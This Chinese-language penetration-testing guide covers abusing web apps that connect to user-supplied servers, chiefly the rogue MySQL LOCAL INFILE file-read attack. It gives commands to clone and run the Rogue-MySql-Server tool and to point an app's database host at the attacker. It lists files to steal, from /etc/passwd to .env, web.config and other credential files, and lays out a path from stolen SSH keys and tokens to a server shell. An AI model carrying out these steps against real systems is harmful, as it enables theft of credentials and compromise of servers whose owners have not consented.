# Web 控制的 Server-side Client Abuse

> 这类问题不一定是经典 SSRF：Web 应用可能真正作为 MySQL/FTP/SMTP/其他协议客户端连接用户指定服务器。攻击点在**恶意服务端返回内容/协议行为**。

---

## 1. 识别入口

Web 功能：

```
Import from database
Database migration
Test DB connection
External data source
Connect MySQL
Backup restore from remote
Integration host / port / username / password
```

如果能控制：

```
host
port
protocol
username
```

且服务器主动向攻击机连接 → 不要只按 URL SSRF 思考。

---

## 2. Rogue MySQL / LOCAL INFILE 文件读取

### 原理

MySQL 客户端启用了 `LOCAL INFILE` 能力时，恶意 MySQL server 可在文件上传协议阶段向客户端请求指定的**客户端本地文件**。

链：

```
Web应用“连接外部MySQL”
  ↓
Host = ATTACKER
  ↓
应用后端MySQL client连接恶意server
  ↓
server请求 LOCAL INFILE /etc/passwd 或应用配置
  ↓
客户端发送文件内容
```

### 前置

```
应用后端确实使用MySQL client协议
客户端允许LOCAL INFILE / local file capability
目标文件对Web进程可读
攻击机端口能被目标访问
```

**没有 LOCAL 能力时，这条链不成立。**

### PoC 工具 — Rogue-MySql-Server

公开工具 `allyshka/Rogue-MySql-Server` 会在客户端发起查询后发送 LOCAL INFILE file request，并把客户端回传内容写入 `mysql.log`。它比较老，Python 实现使用 Python 2 风格代码；现代客户端如果强制 TLS、新 auth plugin 或默认禁用 LOCAL，可能不能直接工作。

```bash
git clone https://github.com/allyshka/Rogue-MySql-Server.git
cd Rogue-MySql-Server
```

编辑 `rogue_mysql_server.py` 顶部：

```python
PORT = 3306
filelist = (
    '/etc/hostname',
)
```

优先在隔离靶场用 Python 2 运行兼容脚本：

```bash
sudo python2 rogue_mysql_server.py
tail -f mysql.log
```

如果本机没有兼容 Python 2 环境，可以使用仓库内 PHP 版本或在隔离容器中运行；**不要为了跑旧 PoC 去替换系统 Python**。

然后在 Web 功能里把数据库 Host/Port 指向攻击机。只要后端 MySQL client 真正发起 query 且允许 LOCAL，`mysql.log` 应出现客户端回传文件内容。

测试目标文件从低风险开始：

```
/etc/hostname
/etc/passwd
/proc/self/cmdline
```

确认后再按应用技术栈：

```
/var/www/.../.env
application.properties
application.yml
web.config
```

### 成功判断

不是“目标连到了攻击机”就成功，而是**攻击机收到目标应用服务器本地文件内容**。

---

## 3. Rogue MySQL → Shell

读到：

```
.env
DB password
SSH key
cloud key
internal admin token
source code
```

继续当前 Web 链：

```
敏感文件
  ↓
管理账号/SSH key/内部Web管理接口
  ↓
可提供服务器shell的入口
  ↓
Shell
```

如果只是数据库凭据且只能直连一个独立 DB 服务，不要自动在本文件做完整数据库渗透；根据当前攻击阶段决定是否回 `/recon`/其他服务流程。

---

## 4. 与 SSRF 区分

```
SSRF:
应用替你发送“你构造的目标请求”

Server-side Client Abuse:
应用使用自己的协议客户端连接你控制的服务，
你通过恶意server响应攻击这个客户端
```

两者可重叠，但验证方法不同。
